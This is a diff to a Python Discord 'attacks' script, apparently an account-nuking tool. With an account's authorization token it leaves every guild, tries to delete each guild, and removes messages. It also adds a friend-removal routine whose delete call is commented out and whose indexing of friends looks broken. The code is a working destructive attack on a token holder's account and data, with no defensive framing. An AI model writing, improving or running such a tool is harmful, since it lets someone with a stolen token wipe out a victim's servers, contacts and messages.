@@ -35,13 +35,19 @@ class attacks():
         }
         guilds = requests.get("https://discord.com/api/v10/users/@me/guilds", headers=headers).json()
         for guild in guilds:
-            try:
-                requests.delete("https://discord.com/api/v10/users/@me/guilds/{}".format(guild["id"]), headers=headers)
-                requests.delete("https://discord.com/api/v10/guilds/{}".format(guild["id"]), headers=headers)
-                print("[*] Leaving guild [SERVER: {}]".format(guild["name"]))
-            except:
-                break
+            requests.delete("https://discord.com/api/v10/users/@me/guilds/{}".format(guild["id"]), headers=headers)
+            requests.delete("https://discord.com/api/v10/guilds/{}".format(guild["id"]), headers=headers)
+            print("[*] Leaving guild [SERVER: {}]".format(guild["name"]))
     
+    def friend_remover(token):
+        headers = {
+            "authorization": token
+        }
+        friends = requests.get("https://discord.com/api/v10/users/@me/relationships", headers=headers).json()
+        for friend in friends:
+            # requests.delete("https://discord.com/api/v10/users/@me/relationships/{}".format(friend["id"]), headers=headers)
+            print("[*] Removing friend [USERNAME: {}]".format(friend[0]))
+            
     def message_remover(token):
         headers = {
             "authorization": token
@@ -65,9 +71,6 @@ class attacks():
                             loop = False
             except:
                 break
-            
-    def friend_remover(token):
-        pass
 
 os.system("cls")
 
